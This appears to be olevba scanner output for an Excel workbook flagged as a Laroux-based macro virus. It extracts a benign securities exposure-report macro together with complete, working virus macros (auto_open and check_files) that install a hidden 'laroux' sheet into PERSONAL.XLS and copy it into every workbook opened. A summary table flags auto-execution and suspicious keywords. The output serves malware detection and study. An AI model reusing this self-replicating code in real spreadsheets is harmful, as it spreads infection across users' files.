olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-83bb817fb7c32b3030b5533a9ab0d5977290f889
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO laroux.bas 
in file: Virus.MSExcel.Laroux-based-83bb817fb7c32b3030b5533a9ab0d5977290f889 - OLE stream: '_VBA_PROJECT_CUR/VBA/laroux'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Option Base 1

Sub Find_Current_Securities()
Attribute Find_Current_Securities.VB_ProcData.VB_Invoke_Func = " \n14"

'   Created by  :   Andrew Stevenson
'   Created on  :   16-Apr-97

'   Aim
'   To find the maturity date column and extract any rows which have a maturity date
'   greater than todays date

'   ***********************************************************************************************

    Dim Local_Counter As Integer
    Dim Var1 As String
    Dim Var2 As Date
    Dim LastRow As Integer
    Dim CurrentRow As Integer
    Dim Active_Repo_RowCounter As Integer
    Dim var4 As String
    Dim Active_Repos() As Integer

'   ***********************************************************************************************
    'Prevent any screen flashing while the macro runs
    Application.ScreenUpdating = False
    Sheets("report").Select
    'Find the column which has the Maturity date in it
    Range("H5").Select
    'Find the last row with data in it
    ActiveCell.SpecialCells(xlLastCell).Select
    LastRow = ActiveCell.Row
    Range("A1").Select
    
    'Move down the row to the end of the sheet and find any columns with mat date > than today
    For Local_Counter = 5 To LastRow
        Range("H" & Trim(Str(Local_Counter))).Select
        'is it a valid date?
        If IsDate(ActiveCell.Value) Then        'Yes, so record the row number
            If ActiveCell.Value > Now() Then
                Active_Repo_RowCounter = Active_Repo_RowCounter + 1
                ReDim Preserve Active_Repos(Active_Repo_RowCounter) As Integer
                Active_Repos(Active_Repo_RowCounter) = ActiveCell.Row
            End If
        End If
    Next Local_Counter
    
    'Next Section - Copy the active repos to a separate sheet
    For Local_Counter = 1 To UBound(Active_Repos)
        Sheets("report").Select
        CurrentRow = Active_Repos(Local_Counter)
        Rows(Trim(Str(CurrentRow)) & ":" & Trim(Str(CurrentRow))).Select
        Selection.Copy
        Sheets("Export").Select
        Rows(Trim(Str(Local_Counter + 1)) & ":" & Trim(Str(Local_Counter + 1))).Select
        ActiveSheet.Paste
    Next Local_Counter
    Sheets("report").Select
    Range("A5").Select
    Sheets("Export").Select
        
    'Apply the totalling of the Exposure
    For Local_Counter = 2 To 16384
        If Range("T" & Trim(Str(Local_Counter))).Value = "" Then Exit For   'end of records
        Range("U" & Trim(Str(Local_Counter))).Select
        If Range("S" & Trim(Str(Local_Counter))).Value < 0 Then             'we are owed the accrued
            ActiveCell.FormulaR1C1 = "=-(ABS(RC[-2]) + ABS(RC[-1]))"
        Else
            ActiveCell.FormulaR1C1 = "=ABS(RC[-2]) - ABS(RC[-1])"
        End If
    Next Local_Counter
    Range("A1").Select
    
    'Clear out the old exposure report
    Sheets("Exposure").Select
    Cells.Select
    Selection.Delete Shift:=xlUp
    Sheets("Export").Select
    
    
    'Move the data to a separate sheet and create an exposure report - Pivot Table
    ActiveSheet.PivotTableWizard SourceType:=xlDatabase, SourceData:= _
        "Export!R1C1:R20C21", TableDestination:="Exposure!R1C1", TableName:= _
        "PivotTable2"
    ActiveSheet.PivotTables("PivotTable2").AddFields RowFields:= _
        "Counterparty Name"
    ActiveSheet.PivotTables("PivotTable2").PivotFields("Exposure"). _
        Orientation = xlDataField
    'Apply Formatting
    Columns("A:A").Select
    Selection.Font.Bold = True
    Columns("A:A").EntireColumn.AutoFit
    Columns("B:B").Select
    Selection.Style = "Comma"
    Columns("B:B").EntireColumn.AutoFit
    Selection.ColumnWidth = 15.67
    Range("A1").Select
    With Selection.Font
        .Name = "Arial"
        .FontStyle = "Bold"
        .Size = 10
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlNone
        .ColorIndex = 2
    End With
    Rows("1:1").Select
    Selection.Insert Shift:=xlDown
    Range("A1").Select
    ActiveCell.FormulaR1C1 = "Exposure Report"
    Range("A1:B1").Select
    With Selection
        .HorizontalAlignment = xlCenterAcrossSelection
        .VerticalAlignment = xlBottom
        .WrapText = False
        .Orientation = xlHorizontal
    End With
    Range("A2").Select
    
    
    'Tidy up
    Application.ScreenUpdating = True
 

End Sub

Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "PERSONAL.XLS")
    If m$ = "PERSONAL.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("laroux").Visible = True
    Sheets("laroux").Select
    Sheets("laroux").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs Filename:=Application.StartupPath & "/" & "PERSONAL.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("laroux").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "personal.xls!check_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "laroux" Then
        Workbooks("PERSONAL.XLS").Sheets("laroux").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("laroux").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "personal.xls!check_files"
    Case Else
End Select
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  larou
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

